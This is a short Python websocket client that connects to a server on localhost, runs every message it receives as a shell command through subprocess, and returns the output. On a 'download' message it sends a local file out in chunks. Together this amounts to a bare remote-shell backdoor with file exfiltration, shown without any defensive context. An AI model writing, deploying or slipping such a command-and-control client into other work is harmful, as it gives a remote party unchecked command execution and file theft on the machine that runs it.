import asyncio
import websockets
import subprocess as sp

async def client():
    uri = "ws://localhost:8765"
    async with websockets.connect(uri, ping_interval=None) as websocket: # I disabled ping as the server uses Input, leades ping isn't recieving
        while True:
            message = await websocket.recv()
            print(f"Received message from server: {message}")
            if message != 'download':
                await websocket.send(sp.getoutput(message))
            elif message == 'download':
                await websocket.send('download')
                with open("/sw4.csv_0.ods", "rb") as file_to_send:
                    while True:
                        chunk = file_to_send.read(200)  # Read a chunk of the file (1024 bytes)
                        if not chunk:
                            await websocket.send('')  # Send an empty message to signal end of file
                            file_to_send.close()
                            break
                        await websocket.send(chunk)
                        #await asyncio.sleep(0.1)



asyncio.get_event_loop().run_until_complete(client())


